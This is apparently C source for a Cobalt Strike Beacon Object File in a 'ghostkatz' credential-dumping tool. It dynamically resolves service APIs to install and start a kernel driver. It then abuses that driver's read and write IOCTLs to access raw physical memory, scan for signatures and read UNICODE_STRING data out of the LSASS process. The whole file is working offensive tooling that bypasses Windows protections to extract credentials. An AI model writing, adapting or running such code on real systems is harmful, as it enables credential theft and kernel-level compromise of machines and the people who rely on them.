#include <windows.h>

#include "beacon.h"
#include "provider.h"
#include "ghostkatz.h"
#include "defs.h"

// DFR
typedef BOOL(NTAPI* fnDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef SC_HANDLE(NTAPI* fnOpenSCManagerA)(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess);
typedef SC_HANDLE(NTAPI* fnOpenServiceA)(SC_HANDLE hSCManager,LPCSTR lpServiceName,DWORD dwDesiredAccess);
typedef SC_HANDLE(NTAPI* fnCreateServiceA)(SC_HANDLE hSCManager,LPCSTR lpServiceName,LPCSTR lpDisplayName,DWORD dwDesiredAccess,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCSTR lpBinaryPathName,LPCSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCSTR lpDependencies,LPCSTR lpServiceStartName,LPCSTR lpPassword);
typedef BOOL(NTAPI* fnStartServiceA)(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCSTR* lpServiceArgVectors);
typedef BOOL(NTAPI* fnQueryServiceStatus)(SC_HANDLE hService, LPSERVICE_STATUS lpServiceStatus);
typedef BOOL(NTAPI* fnControlService)(SC_HANDLE hService,DWORD dwControl,LPSERVICE_STATUS lpServiceStatus);
typedef BOOL(NTAPI* fnDeleteService)(SC_HANDLE hService);
typedef BOOL(NTAPI* fnCloseServiceHandle)(SC_HANDLE hSCObject);

BOOL isServiceInstalled(int provId)
{
    fnOpenSCManagerA pOpenSCManagerA = (fnOpenSCManagerA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "OpenSCManagerA");
    fnOpenServiceA pOpenServiceA = (fnOpenServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "OpenServiceA");
    fnCreateServiceA pCreateServiceA = (fnCreateServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "CreateServiceA");
    fnQueryServiceStatus pQueryServiceStatus = (fnQueryServiceStatus)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "QueryServiceStatus");
    fnStartServiceA pStartServiceA = (fnStartServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "StartServiceA");
    fnCloseServiceHandle pCloseServiceHandle = (fnCloseServiceHandle)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "CloseServiceHandle");

    PROVIDER_INFO* prov_info = GetProviderInfo(provId);

    const char* drvBasePath = "C:\\Windows\\System32\\drivers\\";
    const char* drvName = prov_info->service_name;
    const char* drvFileName = prov_info->driver_filename;
    char drvFullPath[MAX_PATH];
    sprintf(drvFullPath, "%s%s", drvBasePath, drvFileName);

    //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Driver path: %s", drvFullPath);

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to open SCM!\n");
        return FALSE;
    }

    SC_HANDLE hServiceObject = pOpenServiceA(hSCManager, prov_info->service_name, SERVICE_ALL_ACCESS);
    if (hServiceObject == NULL)
    {
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
        {
            hServiceObject = pCreateServiceA(
                hSCManager,
                prov_info->service_name,
                prov_info->service_name,
                SERVICE_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE,
                drvFullPath,
                NULL, NULL, NULL, NULL, ""
            );

            if (hServiceObject == NULL)
            {
                BeaconFormatPrintf(&outputbuffer, "Failed to create driver service! 0x%llx\n", GetLastError());
                pCloseServiceHandle(hSCManager);
                return FALSE;
            }
            else
            {
                BeaconFormatPrintf(&outputbuffer, "Created driver service!\n");

                if (!pStartServiceA(hServiceObject, 0, NULL))
                {
                    DWORD e = GetLastError();
                    if (e == ERROR_SERVICE_ALREADY_RUNNING)
                    {
                        BeaconFormatPrintf(&outputbuffer, "[+] Service already running.\n");
                        pCloseServiceHandle(hServiceObject);
                        pCloseServiceHandle(hSCManager);
                        return TRUE;
                    }
                    else
                    {
                        BeaconFormatPrintf(&outputbuffer, "[!] Failed to start service : %lu\n", e);
                        pCloseServiceHandle(hServiceObject);
                        pCloseServiceHandle(hSCManager);
                        return FALSE;
                    }
                }
                else
                {
                    BeaconFormatPrintf(&outputbuffer, "[+] Started driver service.\n");
                    pCloseServiceHandle(hServiceObject);
                    pCloseServiceHandle(hSCManager);
                    return TRUE;
                }
            }
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "Failed to open service object!\n");
            pCloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    else
    {
        SERVICE_STATUS ss = { 0 };

        BeaconFormatPrintf(&outputbuffer, "[+] Found pre-existing driver service.\n");

        if (!pQueryServiceStatus(hServiceObject, &ss))
        {
            BeaconFormatPrintf(&outputbuffer, "[!] QueryServiceStatus failed: %lu\n", GetLastError());
            pCloseServiceHandle(hServiceObject);
            pCloseServiceHandle(hSCManager);
            return FALSE;
        }

        if (ss.dwCurrentState == SERVICE_RUNNING)
        {
            BeaconFormatPrintf(&outputbuffer, "[+] Service already running.\n");
            pCloseServiceHandle(hServiceObject);
            pCloseServiceHandle(hSCManager);
            return TRUE;
        }

        // Not running -> attempt start
        if (!pStartServiceA(hServiceObject, 0, NULL))
        {
            DWORD e = GetLastError();
            if (e == ERROR_SERVICE_ALREADY_RUNNING)
            {
                BeaconFormatPrintf(&outputbuffer, "[+] Service already running.\n");
                pCloseServiceHandle(hServiceObject);
                pCloseServiceHandle(hSCManager);
                return TRUE;
            }

            BeaconFormatPrintf(&outputbuffer, "[!] Failed to start existing service : %lu\n", e);
            pCloseServiceHandle(hServiceObject);
            pCloseServiceHandle(hSCManager);
            return FALSE;
        }

        BeaconFormatPrintf(&outputbuffer, "[+] Started existing driver service.\n");
        pCloseServiceHandle(hServiceObject);
        pCloseServiceHandle(hSCManager);
        return TRUE;
    }
}


char* GetWinBuildNumber()
{
    static char g_BuildStr[32];  // persists after return
    DWORD cbData = sizeof(g_BuildStr);
    g_BuildStr[0] = '\0';

    LONG st = RegGetValueA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        "CurrentBuildNumber",
        RRF_RT_REG_SZ,
        NULL,
        (PVOID)g_BuildStr,
        &cbData
    );

    if (st != ERROR_SUCCESS) 
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get Windows build number (err=%ld)\n", st);
        return NULL;
    }

    return g_BuildStr;
}

char* GetWinVersion()
{
    static char pvWindowsVersion[32] = { 0 };
    DWORD cbData = 32;
    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_REG_SZ, NULL, pvWindowsVersion, &cbData) != ERROR_SUCCESS)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get Windows version!\n");
        return -1;
    }

    return pvWindowsVersion;
}

BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue)
{
    fnDeviceIoControl pDeviceIoControl = (fnDeviceIoControl)GetProcAddress(GetModuleHandleA("kernel32.dll"), "DeviceIoControl");

    typedef struct _PHYSICAL_WRITE_REQUEST {
        UINT64 PhysicalAddr;
        BYTE Value;
    } PHYSICAL_WRITE_REQUEST, * PPHYSICAL_WRITE_REQUEST;

    PHYSICAL_WRITE_REQUEST request = { 0 };

    int size = sizeof(PHYSICAL_WRITE_REQUEST);
    DWORD bytesReturned = 0;
    UINT32 physAddr = 0;

    request.PhysicalAddr = PhysicalAddress;
    request.Value = WriteValue;

    BOOL result = pDeviceIoControl(hFile,
        TPWSAV_WRITE_IOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        &bytesReturned,
        NULL);

    if (!result) {
        BeaconFormatPrintf(&outputbuffer, "DeviceIoControl failed: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue)
{
    fnDeviceIoControl pDeviceIoControl = (fnDeviceIoControl)GetProcAddress(GetModuleHandleA("kernel32.dll"), "DeviceIoControl");

    typedef struct _PHYSICAL_READ_REQUEST {
        UINT64 PhysicalAddr;
        BYTE ReadValue;
    } PHYSICAL_READ_REQUEST, * PPHYSICAL_READ_REQUEST;


    PHYSICAL_READ_REQUEST request = { 0 };
    int size = sizeof(PHYSICAL_READ_REQUEST);
    DWORD bytesReturned = 0;
    UINT32 physAddr = 0;

    request.PhysicalAddr = PhysicalAddress;
    bytesReturned = 0;

    BOOL result = pDeviceIoControl(hFile, TPWSAV_READ_IOCTL, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
    if (!result) {
        BeaconFormatPrintf(&outputbuffer, "DeviceIoControl failed: %lu\n", GetLastError());
        return FALSE;
    }

    *ReadValue = request.ReadValue;

    return TRUE;
}

unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 PhysicalAddress, BOOL Forwards)
{
    unsigned char* ByteArray = (unsigned char*)malloc(NumberOfBytesToRead * sizeof(unsigned char));
    int j = 0;
    BYTE ReadValue = 0;
    if (Forwards)
    {
        for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + NumberOfBytesToRead; i++)
        {
            ReadByte(hFile, i, &ReadValue);
            ByteArray[j] = ReadValue;
            j++;
        }
    }
    else
    {
        for (DWORD64 i = PhysicalAddress + NumberOfBytesToRead - 1; i >= PhysicalAddress; i--)
        {
            ReadByte(hFile, i, &ReadValue);
            ByteArray[j] = ReadValue;
            j++;
        }
    }

    return ByteArray;
}

DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBytesToRead, DWORD64 PhysicalAddress)
{
    //DEBUG_PRINT("Performing a byte scan starting at physical address 0x%llx\n", PhysicalAddress);

    int ArraySize = sizeof(TargetByteArray) - 1;
    int arrayCounter = 0;

    unsigned char* InternalByteArray = (unsigned char*)malloc(ArraySize * sizeof(char));
    DWORD PhysicalAddressWhereByteArrayFound = 0;
    BYTE readByteValue = 0;

    for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + MaxNumberOfBytesToRead; i++)
    {
        ReadByte(hFile, i, &readByteValue);
        InternalByteArray[arrayCounter] = readByteValue;

        //printf("Target Byte: 0x%x\n", TargetByteArray[arrayCounter]);

        if (arrayCounter == ArraySize - 1)
        {
            PhysicalAddressWhereByteArrayFound = i - ArraySize;
            break;
        }


        if (TargetByteArray[arrayCounter] == 0x90)
        {
            arrayCounter++;
        }
        else if (InternalByteArray[arrayCounter] != TargetByteArray[arrayCounter])
        {
            arrayCounter = 0;
        }
        else
        {
            arrayCounter++;
        }
    }
    free(InternalByteArray);

    return PhysicalAddressWhereByteArrayFound;
}


// Very similar to the ReadMultipleBytes function but we need it to go backwards to read address correctly
DWORD64 ReadAddressAtPhysicalAddressLocation(HANDLE hFile, DWORD64 PhysicalAddress)
{
    BYTE value = 0;
    DWORD64 address = 0;
    for (DWORD64 i = PhysicalAddress + 7; i >= PhysicalAddress; i--)
    {
        ReadByte(hFile, i, &value);
        address = (address << 8);
        address += value;
    }
    return address;
}

wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStructPA, DWORD lower32bits, int LsassPID)
{
    /*
      typedef struct _UNICODE_STRING {
      USHORT Length;         // Offset 0 (2 bytes)
      USHORT MaximumLength;  // Offset 2 (2 bytes)
                             // 4 bytes invisible padding
      PWSTR  Buffer;         // Offset 8 (8 bytes)
    } UNICODE_STRING, *PUNICODE_STRING;
    */

    // It is a UNICODE_STRING struct so we have to get the string length at the first byte, and the pointer to the string will start at 0x8

    // Get length
    BYTE UnicodeStringLength = 0;
    ReadByte(hFile, UnicodeStringStructPA + 0x2, &UnicodeStringLength); // the 0x2 is to get the max length of the unicode string

    // Get address to the wide string
    DWORD64 UnicodeStringPA = 0;
    DWORD64 pUnicodeStringVA = ReadAddressAtPhysicalAddressLocation(hFile, UnicodeStringStructPA + 0x8);
    TranslateUVA2Physical(pUnicodeStringVA, &UnicodeStringPA, lower32bits, LsassPID);

    // Read wide string & store string properly
    wchar_t* UnicodeString = (wchar_t*)malloc(UnicodeStringLength * sizeof(wchar_t));
    int j = 0;
    BYTE ReadValueLow = 0;
    BYTE ReadValueHigh = 0;
    for (DWORD64 i = UnicodeStringPA; i < UnicodeStringPA + UnicodeStringLength; i += 2)
    {
        ReadByte(hFile, i, &ReadValueLow);
        ReadByte(hFile, i + 1, &ReadValueHigh);
        UnicodeString[j] = (wchar_t)(ReadValueLow | ReadValueHigh << 8);
        j++;
    }
    UnicodeString[j] = L'\0';


    return UnicodeString;
}


BOOL PrintHex(unsigned char* ByteArray, int ByteArraySize)
{    
    for (int i = 0; i < ByteArraySize; i++)
    {
        // printf("%02x", (unsigned char*)ByteArray[i]);
        BeaconFormatPrintf(&outputbuffer, "%02x", (unsigned int)ByteArray[i]);
    }
    BeaconFormatPrintf(&outputbuffer, "\n");

    return TRUE;
}


DWORD SearchPattern(unsigned char* mem, DWORD NumOfBytesToSearch, unsigned char* signature, DWORD signatureLen)
{
    ULONG offset = 0;

    // Hunt for signature locally to avoid a load of DeviceIoControl calls
    for (int i = 0; i < NumOfBytesToSearch; i++) {
        if (*(unsigned char*)(mem + i) == signature[0] && *(unsigned char*)(mem + i + 1) == signature[1]) {
            if (memcmp(mem + i, signature, signatureLen) == 0) {
                // Found the signature
                offset = i;
                break;
            }
        }
    }

    return offset;
}
